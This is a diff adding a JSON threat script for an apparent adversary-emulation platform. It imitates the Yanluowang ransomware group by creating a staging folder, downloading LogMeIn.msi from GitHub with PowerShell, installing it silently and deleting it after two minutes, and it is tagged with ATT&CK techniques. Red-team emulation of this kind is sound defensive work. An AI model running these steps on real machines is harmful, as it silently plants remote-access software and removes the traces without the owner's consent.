@@ -1,0 +1,100 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Steps to download and install LogMeIn. Clean-up steps are included after a 2 minute delay.",
+        "display_name": "Yanluowang_LogMeIn",
+        "name": "Yanluowang_LogMeIn",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Create staging directory"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c mkdir \"%HOMEPATH%\\remote\"",
+                "type": "message"
+            },
+            "4": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Download LogMeIn .msi file"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c \"Invoke-WebRequest -Uri 'https://github.com/scythe-jake/staging/blob/main/LogMeIn.msi?raw=true' -OutFile \\\"$HOME\\remote\\LogMeIn.msi\\\"\"",
+                "rtags": [
+                    "att&ck-technique:T1105",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Install LogMeIn"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c msiexec /i \"%HOMEPATH%\\remote\\LogMeIn.msi\" /quiet",
+                "rtags": [
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Clean Up to uninstall program, delete .msi and staging directory"
+            },
+            "9": {
+                "time": "120",
+                "type": "delay"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c msiexec /x \"%HOMEPATH%\\remote\\LogMeIn.msi\" /quiet",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del \"%HOMEPATH%\\remote\\LogMeIn.msi\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del \"%HOMEPATH%\\remote\\\"",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
